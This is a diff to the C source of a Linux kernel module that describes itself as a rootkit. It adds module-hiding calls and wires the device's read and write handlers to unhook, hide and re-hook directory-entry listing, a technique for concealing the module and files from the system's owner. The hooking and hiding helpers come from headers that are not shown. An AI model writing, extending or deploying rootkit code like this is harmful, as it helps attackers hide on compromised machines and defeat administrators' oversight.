@@ -6,6 +6,7 @@
 #include <linux/fs.h>
 #include <linux/string.h>
 #include <hooking.h>
+#include <modhide.h>
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Seb and Gibble");
 MODULE_DESCRIPTION("A non-trivial kernel rootkit");
@@ -58,6 +59,7 @@ static int __init nontrivial_init(void){
 		printk(KERN_ALERT "Failed to create device\n");
 		return -1; //fix this
 	}
+	//hide_module();
 	if (hook_dents() == -1){
 		printk(KERN_INFO "hook failed :(");
 		return -1;
@@ -84,11 +86,14 @@ static int nontrivial_close(struct inode *inode, struct file*f){
 }
 static ssize_t nontrivial_write(struct file *f, const char *buff, size_t len, loff_t *off){
 	printk(KERN_INFO "write to device\n");
+	unhook_dents();
 	return len;
-
 }
 static ssize_t nontrivial_read(struct file*f, char *buff, size_t length, loff_t *offset){
 	printk(KERN_INFO "read from device\n");
+	unhook_dents();
+	hide_module();
+	hook_dents();
 	return 0;
 }
 module_init(nontrivial_init);
